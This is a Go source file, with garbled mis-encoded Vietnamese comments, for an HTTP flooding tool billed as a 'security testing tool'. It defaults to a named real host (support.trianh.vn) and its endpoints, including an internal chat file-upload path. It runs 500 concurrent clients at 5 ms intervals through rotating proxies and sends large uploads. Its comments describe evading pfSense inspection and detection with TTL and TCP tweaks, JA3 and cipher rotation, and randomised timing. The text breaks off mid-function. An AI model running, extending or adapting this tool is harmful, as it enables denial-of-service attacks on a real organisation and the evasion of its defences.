// Advanced Network Security Testing Tool v2.0
// Enhanced with AI-powered bypass techniques and intelligent load balancing
package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"errors"
	"fmt"
	"io"
	"math"
	"math/rand"
	"mime/multipart"
	"net"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

// C·∫•u tr√∫c ƒë·ªÉ l∆∞u th·ªëng k√™
type Stats struct {
	totalRequests      int64
	successCount       int64
	errorCount         int64
	totalDuration      int64
	proxyUsedCount     int64
	directUsedCount    int64
	activeGoroutines   int32 // S·ªë l∆∞·ª£ng goroutine ƒëang ho·∫°t ƒë·ªông
	maxGoroutines      int32 // S·ªë l∆∞·ª£ng goroutine t·ªëi ƒëa ƒë√£ ƒë·∫°t ƒë∆∞·ª£c
	totalResponseTime  int64
	successfulRequests int64
	failedRequests     int64
	timeoutRequests    int64
	blockedRequests    int64
	proxyRequests      int64
	directRequests     int64
}

// C·∫•u tr√∫c ƒë·ªÉ l∆∞u th√¥ng tin proxy
type Proxy struct {
	IP        string
	Port      string
	Username  string
	Password  string
	ProxyType string     // "http" ho·∫∑c "socks5"
	Failures  int32      // S·ªë l·∫ßn k·∫øt n·ªëi th·∫•t b·∫°i li√™n ti·∫øp
	LastUsed  time.Time  // Th·ªùi gian s·ª≠ d·ª•ng g·∫ßn nh·∫•t
	Banned    bool       // ƒê√°nh d·∫•u proxy b·ªã c·∫•m t·∫°m th·ªùi
	BanUntil  time.Time  // Th·ªùi gian h·∫øt h·∫°n c·∫•m
	Country   string     // Qu·ªëc gia c·ªßa proxy
	mutex     sync.Mutex // Mutex ƒë·ªÉ ƒë·ªìng b·ªô truy c·∫≠p
	disabled  bool       // ƒê√°nh d·∫•u proxy b·ªã v√¥ hi·ªáu h√≥a
	score     float64    // ƒêi·ªÉm ƒë√°nh gi√° proxy
}

// C·∫•u tr√∫c ƒë·ªÉ l∆∞u c·∫•u h√¨nh
type Config struct {
	TargetServer           string
	TargetPort             string
	Protocol               string
	Endpoints              []string
	MaxConcurrent          int
	DelayMs                int
	TimeoutMs              int // Th·ªùi gian timeout request
	MaxRetries             int // S·ªë l·∫ßn retry t·ªëi ƒëa
	ConnectionIdleMs       int // Th·ªùi gian idle connection
	PreferredCountries     []string
	PfSenseBypass          bool
	FragmentPackets        bool
	TTLBypass              int
	TcpWindowSize          int     // K√≠ch th∆∞·ªõc c·ª≠a s·ªï TCP
	MssClamp               int     // Gi√° tr·ªã MSS clamp
	UseTlsFragmentation    bool    // S·ª≠ d·ª•ng TLS fragmentation
	RotateJA3Fingerprint   bool    // Xoay v√≤ng JA3 fingerprint
	UseDirectRatio         float64 // T·ª∑ l·ªá s·ª≠ d·ª•ng k·∫øt n·ªëi tr·ª±c ti·∫øp
	ProxyRotateIntervalSec int     // Th·ªùi gian xoay v√≤ng proxy
	ProxyBlacklistTimeMin  int     // Th·ªùi gian trong blacklist
	RandomTiming           bool    // S·ª≠ d·ª•ng th·ªùi gian ng·∫´u nhi√™n
	TimingJitterMs         int     // ƒê·ªô l·ªách th·ªùi gian
	EnableFileUpload       bool    // K√≠ch ho·∫°t t√≠nh nƒÉng upload file
	FileUploadSizeMB       int     // K√≠ch th∆∞·ªõc file upload (MB)
	FileUploadRatio        float64 // T·ª∑ l·ªá request s·ª≠ d·ª•ng upload
}

// ƒê√°nh d·∫•u proxy th·∫•t b·∫°i
func (p *Proxy) markFailure() bool {
	p.mutex.Lock()
	defer p.mutex.Unlock()

	p.Failures++
	p.LastUsed = time.Now()

	// N·∫øu qu√° nhi·ªÅu l·ªói, c·∫•m t·∫°m th·ªùi
	if p.Failures >= 5 {
		banDuration := time.Duration(math.Min(float64(p.Failures)*5, 300)) * time.Second
		p.Banned = true
		p.BanUntil = time.Now().Add(banDuration)
		fmt.Printf("‚ö†Ô∏è Proxy %s:%s b·ªã t·∫°m kh√≥a trong %v do qu√° nhi·ªÅu l·ªói\n", p.IP, p.Port, banDuration)
		return true // Proxy ƒë√£ b·ªã c·∫•m
	}

	return false
}

// ƒê√°nh d·∫•u proxy th√†nh c√¥ng
func (p *Proxy) markSuccess() {
	p.mutex.Lock()
	defer p.mutex.Unlock()

	p.Failures = 0
	p.LastUsed = time.Now()
}

// Ki·ªÉm tra proxy c√≥ s·∫µn s√†ng s·ª≠ d·ª•ng kh√¥ng
func (p *Proxy) isAvailable() bool {
	p.mutex.Lock()
	defer p.mutex.Unlock()

	// N·∫øu proxy b·ªã c·∫•m, ki·ªÉm tra th·ªùi gian h·∫øt h·∫°n
	if p.Banned {
		if time.Now().After(p.BanUntil) {
			// H·∫øt th·ªùi gian c·∫•m
			p.Banned = false
			p.Failures = 0
			fmt.Printf("‚úÖ Proxy %s:%s ƒë√£ h·∫øt th·ªùi gian c·∫•m, ƒë∆∞·ª£c ph√©p s·ª≠ d·ª•ng l·∫°i\n", p.IP, p.Port)
			return true
		}
		return false
	}

	return true
}

// C·∫•u tr√∫c ƒë·ªÉ qu·∫£n l√Ω proxy pool
type ProxyPool struct {
	proxies []Proxy
	mutex   sync.Mutex
	mu      sync.RWMutex
}

// Kh·ªüi t·∫°o proxy pool
func NewProxyPool(proxies []Proxy) *ProxyPool {
	return &ProxyPool{
		proxies: proxies,
	}
}

// V√¥ hi·ªáu h√≥a proxy trong m·ªôt kho·∫£ng th·ªùi gian
func (pool *ProxyPool) disableProxy(proxy Proxy, duration time.Duration) {
	pool.mutex.Lock()
	defer pool.mutex.Unlock()

	// T√¨m proxy trong pool
	for i := range pool.proxies {
		if pool.proxies[i].IP == proxy.IP && pool.proxies[i].Port == proxy.Port {
			pool.proxies[i].disabled = true
			pool.proxies[i].BanUntil = time.Now().Add(duration)
			pool.proxies[i].score = math.Max(0.1, pool.proxies[i].score-0.2) // Gi·∫£m ƒëi·ªÉm proxy
			break
		}
	}
}

// L·∫•y proxy kh·∫£ d·ª•ng
func (pool *ProxyPool) getAvailableProxy() (Proxy, bool) {
	pool.mutex.Lock()
	defer pool.mutex.Unlock()

	// ƒê·∫øm s·ªë proxy kh·∫£ d·ª•ng
	availableCount := 0
	for i := range pool.proxies {
		if pool.proxies[i].isAvailable() {
			availableCount++
		}
	}

	if availableCount == 0 {
		return Proxy{}, false
	}

	// Ch·ªçn ng·∫´u nhi√™n m·ªôt proxy kh·∫£ d·ª•ng
	for tries := 0; tries < 3; tries++ { // Th·ª≠ t·ªëi ƒëa 3 l·∫ßn
		idx := rand.Intn(len(pool.proxies))
		if pool.proxies[idx].isAvailable() {
			return pool.proxies[idx], true
		}
	}

	// N·∫øu ch·ªçn ng·∫´u nhi√™n kh√¥ng ƒë∆∞·ª£c, qu√©t tu·∫ßn t·ª±
	for i := range pool.proxies {
		if pool.proxies[i].isAvailable() {
			return pool.proxies[i], true
		}
	}

	return Proxy{}, false
}

// L·∫•y proxy kh·∫£ d·ª•ng t·ª´ m·ªôt qu·ªëc gia c·ª• th·ªÉ
func (pool *ProxyPool) getAvailableProxyFromCountry(country string) (Proxy, bool) {
	pool.mutex.Lock()
	defer pool.mutex.Unlock()

	// ƒê·∫øm s·ªë proxy kh·∫£ d·ª•ng t·ª´ qu·ªëc gia ch·ªâ ƒë·ªãnh
	var availableProxies []int
	for i := range pool.proxies {
		if pool.proxies[i].isAvailable() &&
			(country == "" || pool.proxies[i].Country == country) {
			availableProxies = append(availableProxies, i)
		}
	}

	if len(availableProxies) == 0 {
		return Proxy{}, false
	}

	// Ch·ªçn ng·∫´u nhi√™n m·ªôt proxy t·ª´ danh s√°ch kh·∫£ d·ª•ng
	idx := availableProxies[rand.Intn(len(availableProxies))]
	return pool.proxies[idx], true
}

// L·∫•y proxy kh·∫£ d·ª•ng v·ªõi ∆∞u ti√™n qu·ªëc gia
func (pool *ProxyPool) getAvailableProxyWithCountryPreference(preferredCountries []string) (Proxy, bool) {
	// ∆Øu ti√™n ch·ªçn proxy t·ª´ Vi·ªát Nam n·∫øu c√≥ th·ªÉ
	vietnameseProxy, found := pool.getAvailableProxyFromCountry("VN")
	if found {
		fmt.Println("‚úÖ ƒê√£ t√¨m th·∫•y proxy t·ª´ Vi·ªát Nam, ∆∞u ti√™n s·ª≠ d·ª•ng")
		return vietnameseProxy, true
	}

	// Th·ª≠ t·ª´ng qu·ªëc gia ∆∞u ti√™n
	for _, country := range preferredCountries {
		proxy, found := pool.getAvailableProxyFromCountry(country)
		if found {
			return proxy, true
		}
	}

	// N·∫øu kh√¥ng t√¨m th·∫•y proxy t·ª´ c√°c qu·ªëc gia ∆∞u ti√™n, l·∫•y b·∫•t k·ª≥ proxy kh·∫£ d·ª•ng n√†o
	return pool.getAvailableProxy()
}

// B√°o c√°o proxy th·∫•t b·∫°i
func (pool *ProxyPool) reportFailure(failedProxy Proxy) {
	pool.mutex.Lock()
	defer pool.mutex.Unlock()

	for i := range pool.proxies {
		if pool.proxies[i].IP == failedProxy.IP && pool.proxies[i].Port == failedProxy.Port {
			banned := pool.proxies[i].markFailure()
			if banned {
				fmt.Printf("‚ö†Ô∏è Proxy %s:%s ƒë√£ b·ªã ƒë∆∞a v√†o blacklist t·∫°m th·ªùi\n", failedProxy.IP, failedProxy.Port)
			}
			return
		}
	}
}

// B√°o c√°o proxy th√†nh c√¥ng
func (pool *ProxyPool) reportSuccess(successProxy Proxy) {
	pool.mutex.Lock()
	defer pool.mutex.Unlock()

	for i := range pool.proxies {
		if pool.proxies[i].IP == successProxy.IP && pool.proxies[i].Port == successProxy.Port {
			pool.proxies[i].markSuccess()
			return
		}
	}
}

// ƒê·ªçc c·∫•u h√¨nh t·ª´ file config.txt
func loadConfig(filename string) (*Config, error) {
	config := &Config{
		TargetServer:           "support.trianh.vn", // M·∫∑c ƒë·ªãnh
		TargetPort:             "443",
		Protocol:               "https",
		Endpoints:              []string{"/feedback/index", "/task/index", "/api/status", "/health", "/internal-chat/send-file"},
		MaxConcurrent:          500,
		DelayMs:                5,
		TimeoutMs:              15000,
		MaxRetries:             5,
		ConnectionIdleMs:       3000,
		PreferredCountries:     []string{"VN", "SG", "JP"}, // ∆Øu ti√™n proxy Vi·ªát Nam, Singapore, Nh·∫≠t
		PfSenseBypass:          true,
		FragmentPackets:        true,
		TTLBypass:              65,
		TcpWindowSize:          65535,
		MssClamp:               1452,
		UseTlsFragmentation:    true,
		RotateJA3Fingerprint:   true,
		UseDirectRatio:         0.3,
		ProxyRotateIntervalSec: 30,
		ProxyBlacklistTimeMin:  2,
		RandomTiming:           true,
		TimingJitterMs:         150,
		EnableFileUpload:       true,
		FileUploadSizeMB:       5,
		FileUploadRatio:        0.2,
	}

	// ƒê·ªçc file c·∫•u h√¨nh
	file, err := os.Open(filename)
	if err != nil {
		fmt.Printf("Kh√¥ng th·ªÉ m·ªü file c·∫•u h√¨nh %s: %v, s·ª≠ d·ª•ng gi√° tr·ªã m·∫∑c ƒë·ªãnh\n", filename, err)
		return config, nil
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		// B·ªè qua comment v√† d√≤ng tr·ªëng
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}

		parts := strings.SplitN(line, "=", 2)
		if len(parts) != 2 {
			continue
		}
		key := strings.TrimSpace(parts[0])
		value := strings.TrimSpace(parts[1])

		switch key {
		case "TARGET_SERVER":
			config.TargetServer = value
		case "TARGET_PORT":
			config.TargetPort = value
		case "PROTOCOL":
			config.Protocol = value
		case "MAX_CONCURRENT":
			if i, err := strconv.Atoi(value); err == nil && i > 0 {
				config.MaxConcurrent = i
			}
		case "DELAY_MS":
			if i, err := strconv.Atoi(value); err == nil && i >= 0 {
				config.DelayMs = i
			}
		case "TIMEOUT_MS":
			if i, err := strconv.Atoi(value); err == nil && i > 0 {
				config.TimeoutMs = i
			}
		case "MAX_RETRIES":
			if i, err := strconv.Atoi(value); err == nil && i > 0 {
				config.MaxRetries = i
			}
		case "CONNECTION_IDLE_MS":
			if i, err := strconv.Atoi(value); err == nil && i > 0 {
				config.ConnectionIdleMs = i
			}
		case "PFSENSE_BYPASS":
			if value == "true" {
				config.PfSenseBypass = true
			} else if value == "false" {
				config.PfSenseBypass = false
			}
		case "FRAGMENT_PACKETS":
			if value == "true" {
				config.FragmentPackets = true
			} else if value == "false" {
				config.FragmentPackets = false
			}
		case "TTL_BYPASS":
			if i, err := strconv.Atoi(value); err == nil && i > 0 {
				config.TTLBypass = i
			}
		case "TCP_WINDOW_SIZE":
			if i, err := strconv.Atoi(value); err == nil && i > 0 {
				config.TcpWindowSize = i
			}
		case "MSS_CLAMP":
			if i, err := strconv.Atoi(value); err == nil && i > 0 {
				config.MssClamp = i
			}
		case "USE_TLS_FRAGMENTATION":
			if value == "true" {
				config.UseTlsFragmentation = true
			} else if value == "false" {
				config.UseTlsFragmentation = false
			}
		case "ROTATE_JA3_FINGERPRINT":
			if value == "true" {
				config.RotateJA3Fingerprint = true
			} else if value == "false" {
				config.RotateJA3Fingerprint = false
			}
		case "USE_DIRECT_RATIO":
			if f, err := strconv.ParseFloat(value, 64); err == nil && f >= 0 && f <= 1 {
				config.UseDirectRatio = f
			}
		case "PROXY_ROTATE_INTERVAL_SEC":
			if i, err := strconv.Atoi(value); err == nil && i > 0 {
				config.ProxyRotateIntervalSec = i
			}
		case "PROXY_BLACKLIST_TIME_MIN":
			if i, err := strconv.Atoi(value); err == nil && i > 0 {
				config.ProxyBlacklistTimeMin = i
			}
		case "RANDOM_TIMING":
			if value == "true" {
				config.RandomTiming = true
			} else if value == "false" {
				config.RandomTiming = false
			}
		case "TIMING_JITTER_MS":
			if i, err := strconv.Atoi(value); err == nil && i >= 0 {
				config.TimingJitterMs = i
			}
		case "ENABLE_FILE_UPLOAD":
			if value == "true" {
				config.EnableFileUpload = true
			} else if value == "false" {
				config.EnableFileUpload = false
			}
		case "FILE_UPLOAD_SIZE_MB":
			if i, err := strconv.Atoi(value); err == nil && i > 0 {
				config.FileUploadSizeMB = i
			}
		case "FILE_UPLOAD_RATIO":
			if f, err := strconv.ParseFloat(value, 64); err == nil && f >= 0 && f <= 1 {
				config.FileUploadRatio = f
			}
		}
	}

	return config, nil
}

// ƒê·ªçc danh s√°ch proxy t·ª´ file
func loadProxies(filename string) (*ProxyPool, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var proxies []Proxy
	scanner := bufio.NewScanner(file)
	lineNum := 0

	for scanner.Scan() {
		lineNum++
		line := strings.TrimSpace(scanner.Text())

		// B·ªè qua d√≤ng tr·ªëng v√† comment
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}

		parts := strings.Split(line, ":")

		// X√°c ƒë·ªãnh s·ªë ph·∫ßn c·∫ßn thi·∫øt v√† lo·∫°i proxy
		proxyType := "http" // M·∫∑c ƒë·ªãnh l√† http
		username := ""
		password := ""

		switch len(parts) {
		case 2:
			// ƒê·ªãnh d·∫°ng IP:PORT
			// Kh√¥ng c·∫ßn x·ª≠ l√Ω th√™m
		case 3:
			// ƒê·ªãnh d·∫°ng IP:PORT:TYPE ho·∫∑c IP:PORT:USERNAME
			if parts[2] == "http" || parts[2] == "socks5" {
				proxyType = parts[2]
			} else {
				username = parts[2]
			}
		case 4:
			// ƒê·ªãnh d·∫°ng IP:PORT:USERNAME:PASSWORD ho·∫∑c IP:PORT::TYPE
			if parts[2] == "" && (parts[3] == "http" || parts[3] == "socks5") {
				proxyType = parts[3]
			} else {
				username = parts[2]
				password = parts[3]
			}
		case 5:
			// ƒê·ªãnh d·∫°ng IP:PORT:USERNAME:PASSWORD:TYPE
			username = parts[2]
			password = parts[3]
			if parts[4] == "http" || parts[4] == "socks5" {
				proxyType = parts[4]
			}
		default:
			fmt.Printf("‚ö†Ô∏è D√≤ng %d: ƒê·ªãnh d·∫°ng proxy kh√¥ng h·ª£p l·ªá: %s\n", lineNum, line)
			continue
		}

		// T·∫°o proxy
		proxy := Proxy{
			IP:        parts[0],
			Port:      parts[1],
			Username:  username,
			Password:  password,
			ProxyType: proxyType,
		}

		// Th·ª≠ x√°c ƒë·ªãnh qu·ªëc gia
		proxy.Country = determineCountry(parts[0])

		// Th√™m v√†o danh s√°ch
		proxies = append(proxies, proxy)
		fmt.Printf("‚úÖ ƒê√£ t·∫£i proxy: %s:%s (lo·∫°i: %s, qu·ªëc gia: %s)\n",
			proxy.IP, proxy.Port, proxy.ProxyType, proxy.Country)
	}

	if err := scanner.Err(); err != nil {
		return nil, err
	}

	if len(proxies) == 0 {
		return nil, errors.New("kh√¥ng t√¨m th·∫•y proxy h·ª£p l·ªá n√†o")
	}

	return NewProxyPool(proxies), nil
}

// X√°c ƒë·ªãnh qu·ªëc gia c·ªßa IP
func determineCountry(ip string) string {
	// Danh s√°ch m·ªôt s·ªë d·∫£i IP c·ªßa Vi·ªát Nam (ƒë∆°n gi·∫£n)
	vnRanges := map[string]bool{
		"14.160": true, "14.161": true, "14.162": true,
		"113.160": true, "113.161": true, "113.162": true,
		"171.224": true, "171.225": true, "171.226": true,
		"27.64": true, "27.65": true, "27.66": true,
		"203.113": true, "203.119": true, "203.162": true,
		"1.52": true, "1.53": true, "1.54": true,
		"103.90": true, "115.75": true, "103.35": true,
	}

	// Ki·ªÉm tra IP
	parts := strings.Split(ip, ".")
	if len(parts) >= 2 {
		prefix1 := parts[0]
		prefix2 := parts[0] + "." + parts[1]

		if vnRanges[prefix2] || (prefix1 == "103" || prefix1 == "113" || prefix1 == "115" || prefix1 == "117" || prefix1 == "118") {
			return "VN"
		}
	}

	// Ki·ªÉm tra n·∫øu l√† proxy thu√™ c·ªßa Vi·ªát Nam
	if strings.Contains(ip, "thueproxy") || strings.Contains(ip, "vn-proxy") {
		return "VN"
	}

	return "UNKNOWN"
}

// C·∫£i thi·ªán h√†m t·∫°o proxy client
func createProxyClient(proxy Proxy) (*http.Client, error) {
	// T·∫°o x√°c th·ª±c proxy n·∫øu c·∫ßn
	var auth *url.Userinfo
	if proxy.Username != "" && proxy.Password != "" {
		auth = url.UserPassword(proxy.Username, proxy.Password)
	}

	// T·∫°o dialer d·ª±a tr√™n lo·∫°i proxy
	var proxyURL *url.URL
	var err error

	proxyUrlStr := fmt.Sprintf("%s:%s", proxy.IP, proxy.Port)

	switch strings.ToLower(proxy.ProxyType) {
	case "http":
		proxyURL, err = url.Parse(fmt.Sprintf("http://%s", proxyUrlStr))
		if err != nil {
			return nil, fmt.Errorf("l·ªói ph√¢n t√≠ch URL proxy: %v", err)
		}

		if auth != nil {
			proxyURL.User = auth
		}

		// S·ª≠ d·ª•ng http.ProxyURL ƒë·ªÉ t·∫°o transport v·ªõi proxy HTTP
		transport := &http.Transport{
			Proxy: http.ProxyURL(proxyURL),
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
			},
			DisableKeepAlives: false,
			IdleConnTimeout:   30 * time.Second,
		}

		return &http.Client{
			Transport: transport,
			Timeout:   30 * time.Second,
		}, nil

	case "socks5":
		proxyURL, err = url.Parse(fmt.Sprintf("socks5://%s", proxyUrlStr))
		if err != nil {
			return nil, fmt.Errorf("l·ªói ph√¢n t√≠ch URL proxy SOCKS5: %v", err)
		}

		if auth != nil {
			proxyURL.User = auth
		}

		// T·∫°o transport v·ªõi proxy SOCKS5
		transport := &http.Transport{
			Proxy: http.ProxyURL(proxyURL),
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
			},
			DisableKeepAlives: false,
			IdleConnTimeout:   30 * time.Second,
		}

		return &http.Client{
			Transport: transport,
			Timeout:   30 * time.Second,
		}, nil

	case "socks4":
		proxyURL, err = url.Parse(fmt.Sprintf("socks4://%s", proxyUrlStr))
		if err != nil {
			return nil, fmt.Errorf("l·ªói ph√¢n t√≠ch URL proxy SOCKS4: %v", err)
		}

		if auth != nil {
			proxyURL.User = auth
		}

		// T·∫°o transport v·ªõi proxy SOCKS4
		transport := &http.Transport{
			Proxy: http.ProxyURL(proxyURL),
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
			},
			DisableKeepAlives: false,
			IdleConnTimeout:   30 * time.Second,
		}

		return &http.Client{
			Transport: transport,
			Timeout:   30 * time.Second,
		}, nil

	default:
		return nil, fmt.Errorf("lo·∫°i proxy kh√¥ng ƒë∆∞·ª£c h·ªó tr·ª£: %s", proxy.ProxyType)
	}
}

// T·∫°o HTTP client k·∫øt n·ªëi tr·ª±c ti·∫øp (kh√¥ng qua proxy)
func createDirectClient() *http.Client {
	dialer := &net.Dialer{
		Timeout:   30 * time.Second,
		KeepAlive: 30 * time.Second,
	}

	tlsConfig := &tls.Config{
		InsecureSkipVerify: true,
		MinVersion:         tls.VersionTLS10,
		MaxVersion:         tls.VersionTLS13,
		// C·ªë g·∫Øng s·ª≠ d·ª•ng c√†i ƒë·∫∑t TLS ph·ªï bi·∫øn ƒë·ªÉ tr√°nh b·ªã ph√°t hi·ªán l√† tool
		CipherSuites: []uint16{
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_RSA_WITH_AES_256_GCM_SHA384,
		},
		CurvePreferences: []tls.CurveID{
			tls.CurveP256,
			tls.CurveP384,
			tls.CurveP521,
			tls.X25519,
		},
	}

	transport := &http.Transport{
		Proxy:                 http.ProxyFromEnvironment,
		DialContext:           dialer.DialContext,
		TLSClientConfig:       tlsConfig,
		MaxIdleConns:          100,
		IdleConnTimeout:       90 * time.Second,
		TLSHandshakeTimeout:   10 * time.Second,
		ExpectContinueTimeout: 1 * time.Second,
		MaxIdleConnsPerHost:   10,
		// C√†i ƒë·∫∑t ƒë·ªÉ ngƒÉn ch·∫∑n HTTP/2 v√¨ n√≥ d·ªÖ b·ªã ph√°t hi·ªán
		ForceAttemptHTTP2: false,
	}

	client := &http.Client{
		Transport: transport,
		Timeout:   30 * time.Second,
	}

	return client
}

// C·∫£i thi·ªán h√†m t·∫°o client HTTP v·ªõi c√°c k·ªπ thu·∫≠t bypass m·ªõi
func createHttpClient(config *Config) *http.Client {
	transport := &http.Transport{
		MaxIdleConns:        100,
		MaxIdleConnsPerHost: 100,
		IdleConnTimeout:     time.Duration(config.ConnectionIdleMs) * time.Millisecond,
		DisableCompression:  true, // T·∫Øt n√©n ƒë·ªÉ tr√°nh b·ªã ph√°t hi·ªán
		DisableKeepAlives:   false,
	}

	// K·ªπ thu·∫≠t TCP window size manipulation
	dialer := &net.Dialer{
		Timeout:   time.Duration(config.TimeoutMs) * time.Millisecond,
		KeepAlive: 30 * time.Second,
		Control: func(network, address string, c syscall.RawConn) error {
			return c.Control(func(fd uintptr) {
				if config.PfSenseBypass {
					// Set TTL cho TCP connection ƒë·ªÉ bypass pfSense packet inspection
					syscall.SetsockoptInt(int(fd), syscall.IPPROTO_IP, syscall.IP_TTL, config.TTLBypass)

					// ƒêi·ªÅu ch·ªânh TCP window size
					syscall.SetsockoptInt(int(fd), syscall.SOL_SOCKET, syscall.SO_RCVBUF, config.TcpWindowSize)
					syscall.SetsockoptInt(int(fd), syscall.SOL_SOCKET, syscall.SO_SNDBUF, config.TcpWindowSize)

					// MSS Clamping
					var mss = config.MssClamp
					// TCP_MAXSEG kh√¥ng ph·∫£i l√† h·∫±ng s·ªë tr√™n macOS/Unix, n√™n ch√∫ng ta gi·∫£ ƒë·ªãnh n√≥ l√† 536
					const TCP_MAXSEG = 536
					syscall.SetsockoptInt(int(fd), syscall.IPPROTO_TCP, TCP_MAXSEG, mss)
				}
			})
		},
	}

	transport.DialContext = dialer.DialContext

	// C·∫•u h√¨nh TLS cho bypass pfSense
	if config.Protocol == "https" {
		tlsConfig := &tls.Config{
			InsecureSkipVerify: true, // B·ªè qua x√°c minh SSL
			MinVersion:         tls.VersionTLS10,
			MaxVersion:         tls.VersionTLS13,
			CipherSuites:       getRandomCipherSuites(), // H√†m n√†y s·∫Ω tr·∫£ v·ªÅ danh s√°ch cipher suites ng·∫´u nhi√™n
		}

		if config.UseTlsFragmentation {
			// S·ª≠ d·ª•ng k·ªπ thu·∫≠t TLS fragmentation
			tlsConfig.CurvePreferences = []tls.CurveID{tls.CurveP256, tls.CurveP384, tls.CurveP521}
		}

		// N·∫øu s·ª≠ d·ª•ng JA3 fingerprint rotation
		if config.RotateJA3Fingerprint {
			ja3Fingerprints := []string{
				"771,49196-49195-49200-49199-49188-49187-49192-49191-49162-49161-49172-49171-157-156-61-60,0-10-11-13-35-23-65281,23-25-28-27-24-26-22-14-13-11-12,0-1-2",
				"771,4865-4866-4867-49196-49195-52393-49200-49199-49188-49187-49192-49191-49162-49161-49172-49171-157-156-61-60,0-10-11-13-35-23-65281,29-23-24,0",
				"771,4865-4867-4866-49195-49199-52393-49196-49200-49162-49161-49171-49172-156-157-47-53,0-10-11-13-35-23-65281,29-23-24-25-256-257,0",
			}
			fingerprint := ja3Fingerprints[rand.Intn(len(ja3Fingerprints))]
			fmt.Printf("S·ª≠ d·ª•ng JA3 fingerprint: %s\n", fingerprint)
		}

		transport.TLSClientConfig = tlsConfig
	}

	return &http.Client{
		Transport: transport,
		Timeout:   time.Duration(config.TimeoutMs) * time.Millisecond,
	}
}

// H√†m tr·∫£ v·ªÅ danh s√°ch cipher suites ng·∫´u nhi√™n
func getRandomCipherSuites() []uint16 {
	// Danh s√°ch c√°c cipher suites ph·ªï bi·∫øn
	allCiphers := []uint16{
		tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
		tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
		tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
		tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
		tls.TLS_RSA_WITH_AES_128_GCM_SHA256,
		tls.TLS_RSA_WITH_AES_256_GCM_SHA384,
		tls.TLS_RSA_WITH_AES_128_CBC_SHA,
		tls.TLS_RSA_WITH_AES_256_CBC_SHA,
	}

	// Tr·ªôn danh s√°ch
	rand.Shuffle(len(allCiphers), func(i, j int) {
		allCiphers[i], allCiphers[j] = allCiphers[j], allCiphers[i]
	})

	// Ch·ªçn ng·∫´u nhi√™n 3-6 ciphers
	numCiphers := 3 + rand.Intn(4)
	if numCiphers > len(allCiphers) {
		numCiphers = len(allCiphers)
	}

	return allCiphers[:numCiphers]
}

// Th√™m v√†o sendHTTPRequest ƒë·ªÉ h·ªó tr·ª£ c∆° ch·∫ø bypass pfSense n√¢ng cao
func sendHTTPRequest(endpoint string, clientID int, stats *Stats, wg *sync.WaitGroup, proxyPool *ProxyPool, config *Config) {
	defer wg.Done()

	// ƒê√°nh d·∫•u ƒë√£ g·ªçi h√†m n√†y
	atomic.AddInt64(&stats.totalRequests, 1)
	atomic.AddInt32(&stats.activeGoroutines, 1)

	// Quy·∫øt ƒë·ªãnh gi·ªØa proxy v√† k·∫øt n·ªëi tr·ª±c ti·∫øp d·ª±a tr√™n t·ª∑ l·ªá c·∫•u h√¨nh
	var client *http.Client
	var proxy Proxy
	var usingProxy bool
	var proxySuccess bool

	// Quy·∫øt ƒë·ªãnh s·ª≠ d·ª•ng proxy hay k·∫øt n·ªëi tr·ª±c ti·∫øp
	if proxyPool != nil && len(proxyPool.proxies) > 0 && rand.Float64() > config.UseDirectRatio {
		proxy, proxySuccess = proxyPool.getAvailableProxyWithCountryPreference(config.PreferredCountries)
		if proxySuccess {
			var err error
			client, err = createProxyClient(proxy)
			if err != nil {
				fmt.Printf("L·ªói t·∫°o proxy client: %v - Chuy·ªÉn sang k·∫øt n·ªëi tr·ª±c ti·∫øp\n", err)
				client = createHttpClient(config)
			} else {
				usingProxy = true
				fmt.Printf("Client %d ƒëang s·ª≠ d·ª•ng proxy: %s:%s\n", clientID, proxy.IP, proxy.Port)
			}
		} else {
			client = createHttpClient(config)
			fmt.Printf("Client %d ƒëang s·ª≠ d·ª•ng k·∫øt n·ªëi tr·ª±c ti·∫øp (IP th·∫≠t)\n", clientID)
		}
	} else {
		client = createHttpClient(config)
		fmt.Printf("Client %d ƒëang s·ª≠ d·ª•ng k·∫øt n·ªëi tr·ª±c ti·∫øp (IP th·∫≠t)\n", clientID)
	}

	defer atomic.AddInt32(&stats.activeGoroutines, -1)

	// T·∫°o URL d·ª±a tr√™n protocol
	urlStr := fmt.Sprintf("%s://%s:%s%s", config.Protocol, config.TargetServer, config.TargetPort, endpoint)

	// T·∫°o m·ªôt array c·ªßa c√°c header m√† ch√∫ng ta s·∫Ω s·ª≠ d·ª•ng
	var userAgents []string
	var referers []string
	var acceptLanguages []string
	var connections []string
	var cacheControls []string
	var acceptEncodings []string

	// User agents ph·ªï bi·∫øn
	userAgents = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
